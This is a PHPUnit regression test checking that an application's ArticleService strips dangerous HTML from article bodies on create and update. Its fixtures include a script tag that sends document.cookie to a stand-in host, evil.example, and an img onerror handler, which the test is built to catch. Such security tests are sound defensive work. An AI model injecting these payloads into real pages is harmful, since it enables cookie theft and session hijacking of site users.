<?php

declare(strict_types=1);

namespace Tests\Modules\Communications;

use App\Core\Database;
use App\Modules\Communications\Services\ArticleService;
use PHPUnit\Framework\TestCase;

/**
 * Regression tests: article bodies are rendered with |raw in the
 * templates, so ArticleService must sanitize HTML on create and update.
 */
class ArticleSanitizationTest extends TestCase
{
    private Database $db;

    protected function setUp(): void
    {
        try {
            $this->db = new Database(TEST_CONFIG['db']);
        } catch (\PDOException $e) {
            $this->markTestSkipped('Test database not available: ' . $e->getMessage());
        }

        $this->db->query("SET FOREIGN_KEY_CHECKS = 0");
        $this->db->query("DROP TABLE IF EXISTS `articles`");
        $this->db->query("SET FOREIGN_KEY_CHECKS = 1");

        $this->db->query("CREATE TABLE `articles` (
            `id` INT UNSIGNED AUTO_INCREMENT PRIMARY KEY,
            `title` VARCHAR(200) NOT NULL,
            `slug` VARCHAR(200) NOT NULL,
            `body` TEXT NULL,
            `excerpt` TEXT NULL,
            `visibility` VARCHAR(20) NOT NULL DEFAULT 'members',
            `node_scope_id` INT UNSIGNED NULL,
            `is_published` TINYINT(1) DEFAULT 0,
            `published_at` DATETIME NULL,
            `author_id` INT UNSIGNED NULL,
            `created_at` DATETIME NOT NULL DEFAULT CURRENT_TIMESTAMP,
            `updated_at` DATETIME NOT NULL DEFAULT CURRENT_TIMESTAMP
        ) ENGINE=InnoDB DEFAULT CHARSET=utf8mb4");
    }

    protected function tearDown(): void
    {
        $this->db->query("DROP TABLE IF EXISTS `articles`");
    }

    public function testCreateSanitizesScriptInjection(): void
    {
        $svc = new ArticleService($this->db);
        $id = $svc->create([
            'title' => 'News',
            'body' => '<p>Legit content</p><script>document.location="https://evil.example?c="+document.cookie</script>',
        ], 1);

        $body = (string) $this->db->fetchColumn("SELECT body FROM articles WHERE id = :id", ['id' => $id]);
        $this->assertStringNotContainsString('<script', $body);
        $this->assertStringNotContainsString('document.cookie', $body);
        $this->assertStringContainsString('<p>Legit content</p>', $body);
    }

    public function testUpdateSanitizesEventHandlers(): void
    {
        $svc = new ArticleService($this->db);
        $id = $svc->create(['title' => 'News', 'body' => '<p>Original</p>'], 1);

        $svc->update($id, ['body' => '<img src="x" onerror="alert(1)"><p>Updated</p>']);

        $body = (string) $this->db->fetchColumn("SELECT body FROM articles WHERE id = :id", ['id' => $id]);
        $this->assertStringNotContainsString('onerror', $body);
        $this->assertStringContainsString('<p>Updated</p>', $body);
    }
}
